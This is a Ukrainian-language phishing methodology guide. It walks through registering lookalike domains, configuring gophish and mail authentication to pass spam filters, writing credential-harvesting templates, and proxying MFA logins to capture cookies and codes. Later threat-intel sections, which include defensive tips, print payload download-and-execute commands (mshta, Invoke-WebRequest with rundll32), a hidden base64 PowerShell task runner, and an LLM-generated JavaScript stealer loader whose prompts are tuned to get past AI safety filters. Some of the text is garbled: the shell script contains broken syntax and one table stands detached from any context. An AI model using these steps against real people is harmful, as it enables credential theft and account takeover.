## Методологія

1. Проведіть розвідку жертви
   1. Виберіть **домен жертви**.
   2. Проведіть базову веброзвідку, **шукаючи сторінки входу**, якими користується жертва, і **вирішіть**, яку з них ви будете **імітувати**.
   3. Використайте **OSINT**, щоб **знайти адреси електронної пошти**.
2. Підготуйте середовище
   1. **Придбайте домен**, який використовуватимете для оцінювання фішингу.
   2. **Налаштуйте пов’язані із сервісом електронної пошти записи** (SPF, DMARC, DKIM, rDNS).
   3. Налаштуйте VPS із **gophish**.
3. Підготуйте кампанію
   1. Підготуйте **шаблон електронного листа**.
   2. Підготуйте **вебсторінку** для викрадення облікових даних.
4. Запустіть кампанію!

## Створення схожих доменних імен або придбання домену з хорошою репутацією

### Техніки варіації доменних імен

- **Ключове слово**: доменне ім’я **містить** важливе **ключове слово** з оригінального домену (наприклад, zelster.com-management.com).<sup>[[1]](#references)</sup>
- **Дефіс у піддомені**: замініть **крапку на дефіс** у піддомені (наприклад, www-zelster.com).
- **Новий TLD**: те саме доменне ім’я з **новим TLD** (наприклад, zelster.org).
- **Homoglyph**: **замініть** літеру в доменному імені на **схожу за виглядом літеру** (наприклад, zelfser.com).

- **Перестановка:** **поміняйте місцями дві літери** в доменному імені (наприклад, zelsetr.com).
- **Однина/множина**: додайте або вилучіть «s» у кінці доменного імені (наприклад, zeltsers.com).
- **Пропуск**: **вилучіть одну** з літер доменного імені (наприклад, zelser.com).
- **Повторення:** **повторіть одну** з літер у доменному імені (наприклад, zeltsser.com).
- **Заміна**: як Homoglyph, але менш непомітно. Замініть одну з літер у доменному імені, можливо, на літеру, розташовану поруч з оригінальною на клавіатурі (наприклад, zektser.com).
- **Домен із піддоменом**: додайте **крапку** всередину доменного імені (наприклад, ze.lster.com).
- **Вставлення**: **вставте літеру** в доменне ім’я (наприклад, zerltser.com).
- **Відсутня крапка**: додайте TLD до доменного імені (наприклад, zelstercom.com).

### Bitflipping

Існує **ймовірність, що деякі біти в даних або під час передавання автоматично змінять значення** через різні чинники, як-от сонячні спалахи, космічні промені або апаратні помилки.

Якщо **застосувати цю концепцію до DNS-запитів**, домен, який **отримає DNS-сервер**, може відрізнятися від домену, запитаного спочатку.

Наприклад, зміна одного біта в домені «windows.com» може перетворити його на «windnws.com».

Зловмисники можуть **скористатися цим, зареєструвавши кілька доменів, утворених зміною бітів**, які схожі на домен жертви. Їхня мета — перенаправляти легітимних користувачів на власну інфраструктуру.

Докладніше див. [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/).<sup>[[10]](#references)[[11]](#references)</sup>

## Налаштування GoPhish

### Встановлення

Завантажити його можна за посиланням [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Завантажте архів, розпакуйте його в `/opt/gophish` і запустіть `/opt/gophish/gophish`\
У виводі буде вказано пароль адміністратора для порту 3333. Тож перейдіть на цей порт і скористайтеся цими обліковими даними, щоб змінити пароль адміністратора. Можливо, доведеться прокинути цей порт на локальну машину:

```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```

### Налаштування

**Налаштування TLS-сертифіката**

Перед цим кроком ви вже маєте **придбати домен**, який будете використовувати, і він має **вказувати** на **IP VPS**, де ви налаштовуєте **gophish**.

```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```

**Конфігурація пошти**

Почніть встановлення: `apt-get install postfix`

Потім додайте домен до таких файлів:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Також змініть значення таких змінних у файлі /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Нарешті, змініть файли **`/etc/hostname`** і **`/etc/mailname`**, указавши назву вашого домену, і **перезапустіть VPS.**

Тепер створіть **DNS A-запис** для `mail.<domain>`, який вказуватиме на **IP-адресу** VPS, а також **DNS MX-запис**, який вказуватиме на `mail.<domain>`.

Тепер перевіримо надсилання електронного листа:

```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```

**Конфігурація Gophish**

Зупиніть виконання gophish і налаштуймо його.\
Змініть `/opt/gophish/config.json` на таку конфігурацію (зверніть увагу на використання https):

```bash
{
        "admin_server": {
                "listen_url": "127.0.0.1:3333",
                "use_tls": true,
                "cert_path": "gophish_admin.crt",
                "key_path": "gophish_admin.key"
        },
        "phish_server": {
                "listen_url": "0.0.0.0:443",
                "use_tls": true,
                "cert_path": "/opt/gophish/ssl_keys/key.crt",
                "key_path": "/opt/gophish/ssl_keys/key.pem"
        },
        "db_name": "sqlite3",
        "db_path": "gophish.db",
        "migrations_prefix": "db/db_",
        "contact_address": "",
        "logging": {
                "filename": "",
                "level": ""
        }
}
```

**Налаштуйте службу gophish**

Щоб створити службу gophish, яка запускатиметься автоматично та якою можна буде керувати як службою, створіть файл `/etc/init.d/gophish` із таким вмістом:

```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
    echo 'Starting '${processName}'...'
    cd ${appDirectory}
    nohup ./$process >>$logfile 2>>$errfile &
    sleep 1
}

stop() {
    echo 'Stopping '${processName}'...'
    pid=$(/bin/pidof ${process})
    kill ${pid}
    sleep 1
}

status() {
    pid=$(/bin/pidof ${process})
    if [["$pid" != ""| "$pid" != "" ]]; then
        echo ${processName}' is running...'
    else
        echo ${processName}' is not running...'
    fi
}

case $1 in
    start|stop|status) "$1" ;;
esac
```

Завершіть налаштування служби та перевірте її, виконавши:

```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```

## Налаштування поштового сервера та домену

### Зачекайте й дійте легітимно

Що старший домен, то менша ймовірність, що його позначать як спам. Тому перед оцінюванням фішингу слід зачекати якомога довше (щонайменше 1 тиждень). Крім того, якщо розмістити на ньому сторінку про сектор із доброю репутацією, репутація домену буде кращою.

Зверніть увагу: навіть якщо потрібно зачекати тиждень, налаштувати все можна вже зараз.

### Налаштування запису Reverse DNS (rDNS)

Налаштуйте запис rDNS (PTR), який перетворює IP-адресу VPS на доменне ім’я.

### Запис Sender Policy Framework (SPF)

Необхідно **налаштувати запис SPF для нового домену**. Якщо ви не знаєте, що таке запис SPF, [**прочитайте цю сторінку**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Для створення політики SPF можна скористатися сервісом [https://www.spfwizard.net/](https://www.spfwizard.net) (використовуйте IP-адресу VPS).

![Форма SPF Wizard для створення запису SPF для фішингового домену](<../../images/image (1037).png>)

Цей текст потрібно додати в запис TXT домену:

```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```

### Запис автентифікації, звітності та відповідності повідомлень на основі домену (DMARC)

Ви маєте **налаштувати запис DMARC для нового домену**. Якщо ви не знаєте, що таке запис DMARC, [**прочитайте цю сторінку**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Створіть новий запис DNS TXT для хоста `_dmarc.<domain>` із таким вмістом:

```bash
v=DMARC1; p=none
```

### DomainKeys Identified Mail (DKIM)

Ви маєте **налаштувати DKIM для нового домену**. Якщо ви не знаєте, що таке запис DKIM, [**прочитайте цю сторінку**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

### Перевірте оцінку конфігурації електронної пошти

Це можна зробити за допомогою [https://www.mail-tester.com/](https://www.mail-tester.com)\

```bash
==========================================================

==========================================================

DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```

Ви також можете надіслати **повідомлення на адресу Gmail під вашим контролем** і перевірити **заголовки листа** у своїй скриньці Gmail: у полі заголовка `Authentication-Results` має бути `dkim=pass`.

```

       spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
       dkim=pass header.i=@example.com;
```

### Шаблон листа

- Вкажіть **назву для ідентифікації** шаблону
- Потім напишіть **тему** (нічого незвичного — просто те, що ви могли б очікувати побачити у звичайному листі)
- Переконайтеся, що встановлено прапорець "**Add Tracking Image**"
- Напишіть **шаблон листа** (можна використовувати змінні, як у прикладі нижче):

```html
<html>
<head>
    <title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```

Зверніть увагу: **щоб підвищити довіру до листа**, рекомендується використати підпис із листа клієнта. Ось кілька варіантів:

- Надішліть лист на **неіснуючу адресу** та перевірте, чи буде у відповіді підпис.
- Знайдіть **публічні адреси електронної пошти**, як-от info@ex.com, press@ex.com або public@ex.com, надішліть їм листа й дочекайтеся відповіді.
- Спробуйте зв’язатися з **якоюсь виявленою дійсною адресою** та дочекайтеся відповіді.

## Фішинг MFA

### Через проксі MitM

Попередня атака доволі хитра: ви підробляєте справжній вебсайт і збираєте дані, введені користувачем. На жаль, **ці дані не дадуть змоги видати себе за ошуканого користувача**, якщо він не ввів правильний пароль або якщо підроблена вами програма налаштована з 2FA.

Тут стануть у пригоді такі інструменти, як [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) і [**muraena**](https://github.com/muraenateam/muraena). Цей інструмент дасть змогу виконати атаку типу MitM. Загалом атака відбувається так:

1. Ви **підробляєте форму входу** справжньої вебсторінки.
2. Користувач **надсилає** свої **облікові дані** на вашу підроблену сторінку, а інструмент передає їх на справжню вебсторінку, **перевіряючи, чи працюють вони**.
3. Якщо для облікового запису налаштовано **2FA**, сторінка MitM запросить код, а щойно **користувач його введе**, інструмент передасть його на справжню вебсторінку.
4. Після автентифікації користувача ви, як атакувальник, **перехопите облікові дані, 2FA, cookie та будь-яку інформацію з його взаємодій**, поки інструмент виконує MitM-атаку.

### Через VNC

А що, як замість того, щоб **переспрямовувати жертву на шкідливу сторінку**, схожу на оригінальну, спрямувати її до **сеансу VNC із браузером, підключеним до справжньої вебсторінки**? Ви зможете бачити її дії, викрасти пароль, використаний MFA, cookie...\
Для цього можна використати [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC).<sup>[[3]](#references)[[4]](#references)</sup>

## Виявлення виявлення

Очевидно, один із найкращих способів дізнатися, чи вас викрили, — **перевірити, чи є ваш домен у чорних списках**. Якщо він там є, значить, ваш домен якимось чином позначили як підозрілий.\
Простий спосіб перевірити, чи є ваш домен у чорних списках, — скористатися [https://malwareworld.com/](https://malwareworld.com)

Однак є й інші способи з’ясувати, чи **жертва активно шукає підозрілу фішингову активність у відкритому доступі**, як пояснюється тут:


{{#ref}}
detecting-phising.md
{{#endref}}

Можна **придбати домен із назвою, дуже схожою на домен жертви**, та/або **створити сертифікат** для **субдомену** домену під вашим контролем, **додавши** до нього **ключове слово** з домену жертви. Якщо **жертва** виконає будь-яку **взаємодію через DNS або HTTP** із ними, ви дізнаєтеся, що **вона активно шукає** підозрілі домени, і вам доведеться діяти дуже непомітно.<sup>[[2]](#references)</sup>

### Оцінювання фішингу

Скористайтеся [**Phishious** ](https://github.com/Rices/Phishious), щоб оцінити, чи потрапить ваш лист у спам, чи його буде заблоковано, чи він успішно дійде до адресата.

## Компрометація ідентичності через персональну взаємодію (скидання MFA через службу підтримки)

Сучасні групи зловмисників дедалі частіше повністю оминають фішингові листи й **безпосередньо атакують процеси служби підтримки / відновлення ідентичності**, щоб обійти MFA. Атака повністю спирається на наявні в системі засоби: отримавши дійсні облікові дані, оператор переміщується далі за допомогою вбудованих адміністративних інструментів — шкідливе ПЗ не потрібне.<sup>[[6]](#references)</sup>

### Послідовність атаки
1. Збір інформації про жертву
   * Зберіть персональні й корпоративні дані з LinkedIn, витоків даних, публічного GitHub тощо.
   * Визначте цінні облікові записи (керівників, IT-фахівців, фінансистів) і з’ясуйте **точний процес служби підтримки** для скидання пароля / MFA.
2. Соціальна інженерія в реальному часі
   * Зателефонуйте, напишіть у Teams або чат служби підтримки, видаючи себе за цільову особу (часто використовуючи **підміну caller ID** або **клонування голосу**).
   * Надайте зібрані раніше персональні дані, щоб пройти перевірку на основі контрольних запитань.
   * Переконайте агента **скинути секрет MFA** або виконати **SIM-swap** для зареєстрованого номера мобільного телефону.
3. Дії одразу після отримання доступу (у реальних випадках — не більш ніж за 60 хвилин)
   * Отримайте початковий доступ через будь-який вебпортал SSO.
   * Перелічіть об’єкти AD / AzureAD за допомогою вбудованих засобів (не розгортайте бінарні файли):
     ```powershell
     # list directory groups & privileged roles
     Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

     # AzureAD / Graph – list directory roles
     Get-MgDirectoryRole | ft DisplayName,Id

     # Enumerate devices the account can login to
     Get-MgUserRegisteredDevice -UserId <user@corp.local>
     ```
   * Lateral movement за допомогою **WMI**, **PsExec** або легітимних агентів **RMM**, які вже внесені до списку дозволених у середовищі.

### Виявлення та пом’якшення наслідків
* Вважайте відновлення облікових даних через службу підтримки **привілейованою операцією** — вимагайте додаткової автентифікації та схвалення керівника.
* Розгорніть правила **Identity Threat Detection & Response (ITDR)** / **UEBA**, які сповіщають про:  
  * Зміну методу MFA та автентифікацію з нового пристрою / з іншого географічного місця.  
  * Негайне підвищення привілеїв того самого principal (user-→-admin).
* Записуйте дзвінки до служби підтримки та вимагайте **зворотного дзвінка на вже зареєстрований номер** перед будь-яким скиданням.
* Упровадьте **Just-In-Time (JIT) / Privileged Access**, щоб щойно скинуті облікові записи **не отримували автоматично токени з високими привілеями**.

## Масштабний обман — SEO poisoning і кампанії “ClickFix”
Звичайні кіберзлочинні угруповання компенсують витрати на цільові операції масовими атаками, перетворюючи **пошукові системи й рекламні мережі на канал доставки**.<sup>[[6]](#references)</sup>

1. **SEO poisoning / malvertising** виводить фальшивий результат, наприклад `chromium-update[.]site`, на верхні позиції пошукової реклами.
2. Жертва завантажує невеликий **завантажувач першого етапу** (часто JS/HTA/ISO). Приклади, виявлені Unit 42:
   * `RedLine stealer`
   * `Lumma stealer`
   * `Lampion Trojan`
3. Завантажувач викрадає cookie браузера та бази даних облікових даних, а потім завантажує **непомітний завантажувач**, який вирішує — *у реальному часі* — розгорнути:
   * RAT (наприклад, AsyncRAT, RustDesk)
   * ransomware / wiper
   * компонент закріплення (ключ реєстру Run + заплановане завдання)

### Поради з посилення захисту
* Блокуйте нещодавно зареєстровані домени та застосовуйте **Advanced DNS / URL Filtering** і до *пошукової реклами*, і до електронної пошти.
* Дозволяйте встановлення програмного забезпечення лише з підписаних пакетів MSI / Store, забороняйте виконання `HTA`, `ISO`, `VBS` за допомогою політик.
* Відстежуйте дочірні процеси браузерів, які запускають інсталятори:
  ```yaml
  - parent_image: /Program Files/Google/Chrome/*
    and child_image: *\\*.exe
  ```
* Шукайте LOLBins, якими часто зловживають завантажувачі першого етапу (наприклад, `regsvr32`, `curl`, `mshta`).

### Перехоплення кліку кнопки завантаження з передаванням до TDS
Деякі фальшиві портали програмного забезпечення залишають видимий `href` для завантаження, що вказує на **справжню** URL-адресу GitHub/release, але перехоплюють **першу** взаємодію користувача за допомогою JavaScript і перенаправляють жертву до ланцюжка **Traffic Distribution System (TDS)**.<sup>[[9]](#references)</sup>

```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
  if (!isEligibleClick(e.target)) return;
  cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
  e.stopImmediatePropagation();
  e.preventDefault();
}, true);
```

Ключові ознаки:
- Хук зазвичай запускається у **фазі capture** (`true`) на `document`, тому спрацьовує раніше за обробники сайту.
- Chrome часто використовує `mousedown` замість `click`, щоб прив’язати редирект до дійсного **жесту користувача** й ефективніше обходити блокувальник спливаючих вікон.
- Деякі варіанти спочатку відкривають `about:blank` або генерують кліки по `<a target="_blank">`, а URL TDS призначають пізніше.
- Обмеження на стороні браузера зазвичай зберігаються в `localStorage`, тож під час **першого кліку** користувач може перейти на malware, тоді як після оновлення сторінки чи повторних спроб його скеровують за видимим посиланням, яке виглядає нешкідливим.
- TDS може фільтрувати за referrer, доменом входу, GEO, відбитком браузера/пристрою, перевірками VPN/датацентру, контекстом кліку та лічильниками сеансів, через що повторне відтворення аналітиками дає нестабільні результати.

Поради для захисників:
- Порівнюйте **відображений** `href` із фактичною ціллю навігації, яка формується під час кліку.
- Шукайте обробники `document.addEventListener(..., true)`, які викликають і `preventDefault()`, і `stopImmediatePropagation()` навколо `window.open`, `about:blank` або кліків по синтетичних anchor-елементах.
- Розглядайте кластери щойно зареєстрованих доменів для завантаження програмного забезпечення, які завантажують однаковий етап CloudFront/JS, як характерну ознаку SEO-poisoning/TDS.

### ClickFix через фальшиві сторінки перевірки + завантаження LOLBAS, замасковані під архіви
Деякі гілки TDS приводять на фальшиву сторінку перевірки (у стилі Cloudflare/IUAM), яка пропонує жертві запустити довірений бінарний файл Windows, наприклад:<sup>[[9]](#references)</sup>

```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```

Нотатки:
- `mshta.exe` виконує **HTA/VBScript на початку відповіді**, навіть якщо URL видає себе за архів `.7z`; додані дані архіву можуть бути суто приманкою.
- Наступні етапи часто продовжують брехати про тип файлу (`.rtf` для PowerShell, `.asar` для Python, ZIP-архіви з файлами-бінарниками, доповненими до потрібного розміру), а потім переходять до **manual PE mapping / in-memory execution**.
- Якщо ви реагуєте на один із таких ланцюжків, зберігайте **мережеві дані та вміст пам’яті з першого успішного запуску**: під час повторного відтворення може бути видно лише нешкідливий шлях інсталятора/SFX або запуск може завершитися помилкою, оскільки видача payload/key була прив’язана до початкової сесії TDS.

### Tradecraft доставки DLL через ClickFix (фальшиве оновлення CERT)
* Приманка: клонована рекомендація національного CERT із кнопкою **Update**, яка показує покрокові інструкції «виправлення». Жертвам пропонують запустити batch-файл, який завантажує DLL і виконує її через `rundll32`.<sup>[[12]](#references)</sup>
* Типовий ланцюжок batch-команд, який спостерігали:
  ```cmd
  echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
  echo timeout /t 10
  echo rundll32.exe "%TEMP%\notepad2.dll",notepad
  ```
  * `Invoke-WebRequest` зберігає payload у `%TEMP%`, коротка пауза приховує мережевий джиттер, а потім `rundll32` викликає експортовану точку входу (`notepad`).
* DLL надсилає beacon з ідентифікацією хоста та опитує C2 кожні кілька хвилин. Віддалені завдання надходять у вигляді **base64-кодованого PowerShell**, який виконується приховано та з обходом політики:
  ```powershell
  powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
  ```
  * Це зберігає гнучкість C2 (сервер може змінювати завдання без оновлення DLL) і приховує вікна консолі. Шукайте процеси PowerShell, дочірні для `rundll32.exe`, де разом використовуються `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression`.
* Захисники можуть шукати HTTP(S)-запити зворотного виклику у форматі `...page.php?tynor=<COMPUTER>sss<USER>` та інтервали опитування у 5 хвилин після завантаження DLL.

## Malvertising через RTB, активований показом реклами

На відміну від спонсорованого результату пошуку, для якого потрібен клік, RTB-реклама може завантажувати сторонній JavaScript під час показу рекламного креативу на вебсайті або в застосунку. Citizen Lab спостерігала, як рекламні теги надсилали запити до окремого сервера прийняття рішень із рекламними ідентифікаторами. Більшість показів отримували порожню відповідь; окремі покази могли отримати JavaScript. Тому нешкідлива відповідь під час повторного відтворення не доводить, що всі глядачі отримували однаковий вміст.<sup>[[14]](#references)</sup>

Це **механізм доставки**, а не експлойт сам по собі: виконання JavaScript у контексті показу реклами не призводить автоматично до встановлення шпигунського ПЗ. Базовий експлойт браузера або ОС не було розкрито, тому сам по собі показ реклами чи запит до сервера прийняття рішень не є доказом зараження. Про прив’язку ідентифікаторів у RTB-таргетингу див. [Моделювання загроз і розділення ідентичностей](../../privacy/threat-modeling-and-identity-separation.md).<sup>[[14]](#references)</sup>

|Генеративний AI|Створювати *унікальні* листи з посиланнями на публічні M&A та жарти з соцмереж; використовувати deepfake-голос CEO у шахрайських дзвінках.|
|Агентний AI|Автономно реєструвати домени, збирати розвіддані з відкритих джерел, готувати листи наступного етапу, коли жертва натискає посилання, але не надсилає облікові дані.|

**Захист:**  
• Додавайте **динамічні банери**, що позначають повідомлення, надіслані ненадійною автоматизацією (за аномаліями ARC/DKIM).  
• Використовуйте **біометричні фрази-перевірки голосу** для телефонних запитів із високим ризиком.  
• Постійно моделюйте приманки, згенеровані AI, у програмах обізнаності — статичні шаблони застаріли.

## Збирання фішингового JavaScript під час виконання за допомогою LLM (генерація коду в браузері)

Зловмисники можуть надсилати HTML, що виглядає нешкідливо, і **генерувати stealer під час виконання**, запитуючи JavaScript у **довіреного API LLM**, а потім виконуючи його в браузері (наприклад, через `eval` або динамічний `<script>`).<sup>[[8]](#references)</sup>

1. **Промпт як обфускація:** кодувати URL для ексфільтрації/Base64-рядки в промпті; ітеративно змінювати формулювання, щоб обходити фільтри безпеки й зменшувати кількість галюцинацій.
2. **Виклик API на стороні клієнта:** під час завантаження JS звертається до публічної LLM (Gemini/DeepSeek тощо) або CDN-проксі; у статичному HTML присутній лише промпт/виклик API.
3. **Збирання та виконання:** об’єднати відповідь і виконати її (поліморфно для кожного відвідування):

```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
  .then(r=>r.json())
  .then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```

4. **Phish/exfil:** згенерований код персоналізує приманку (наприклад, розбирає токен LogoKit) і надсилає creds на прихований у prompt endpoint.

**Ознаки ухилення**
- Трафік проходить через добре відомі домени LLM або надійні CDN-проксі; іноді — через WebSockets до backend.
- Статичного payload немає; шкідливий JS з’являється лише після рендерингу.
- Недетерміновані генерації створюють **унікальні** stealer-и для кожної сесії.

**Ідеї для виявлення**
- Запускайте sandbox-и з увімкненим JS; позначайте **runtime `eval`/динамічне створення скриптів із відповідей LLM**.
- Виявляйте POST-запити з front end до API LLM, за якими одразу виконуються `eval`/`Function` над отриманим текстом.
- Створюйте сповіщення про несанкціоновані домени LLM у клієнтському трафіку та подальші POST-запити з обліковими даними.

## Варіант MFA Fatigue / Push Bombing – примусове скидання
Окрім класичного push-bombing, оператори просто **примусово реєструють MFA заново** під час дзвінка до служби підтримки, анулюючи наявний токен користувача. Будь-який наступний запит на вхід виглядає для жертви легітимним.

```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```

Відстежуйте події AzureAD/AWS/Okta, коли **`deleteMFA` + `addMFA`** відбуваються **протягом кількох хвилин з однієї IP-адреси**.

### Перехоплення прив’язки пристрою WhatsApp за допомогою QR-коду та соціальної інженерії
* На сторінці-приманці (наприклад, підробленому «каналі» міністерства/CERT) показують QR-код WhatsApp Web/Desktop і просять жертву відсканувати його, непомітно додаючи зловмисника як **прив’язаний пристрій**.<sup>[[12]](#references)</sup>
* Зловмисник одразу отримує доступ до чатів і контактів, доки сесію не буде завершено. Згодом жертви можуть побачити сповіщення «прив’язано новий пристрій»; захисники можуть шукати неочікувані події прив’язки пристроїв невдовзі після відвідування ненадійних сторінок із QR-кодами.

### Фішинг із перевіркою мобільного пристрою для обходу краулерів і пісочниць
Оператори дедалі частіше приховують фішингові сценарії за простою перевіркою пристрою, щоб краулери на настільних комп’ютерах не переходили на кінцеві сторінки. Типовий підхід — невеликий скрипт, який перевіряє наявність DOM із підтримкою сенсорного вводу та надсилає результат на кінцеву точку сервера; клієнти, що не є мобільними, отримують HTTP 500 (або порожню сторінку), тоді як мобільним користувачам показують повний сценарій.<sup>[[7]](#references)</sup>

Мінімальний фрагмент клієнтського коду (типова логіка):

```html
<script src="/static/detect_device.js"></script>
```

`detect_device.js` логіка (спрощено):

```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
  .then(()=>location.reload());
```

Поведінка сервера, яку часто спостерігають:
- Встановлює cookie сесії під час першого завантаження.
- Приймає `POST /detect {"is_mobile":true|false}`.
- Повертає 500 (або placeholder) для наступних GET-запитів, якщо `is_mobile=false`; показує phishing-вміст лише за значення `true`.

Евристики пошуку та виявлення:
- Запит urlscan: `filename:"detect_device.js" AND page.status:500`
- Телеметрія вебтрафіку: послідовність `GET /static/detect_device.js` → `POST /detect` → HTTP 500 для пристроїв не мобільного типу; запити від справжніх мобільних жертв повертають 200 із подальшим HTML/JS.
- Блокуйте або перевіряйте сторінки, які показують вміст лише за умови `ontouchstart` або подібних перевірок пристрою.

Поради щодо захисту:
- Запускайте краулери з відбитками, схожими на мобільні пристрої, та ввімкненим JS, щоб виявити прихований вміст.
- Налаштуйте сповіщення про підозрілі відповіді 500 після `POST /detect` на щойно зареєстрованих доменах.
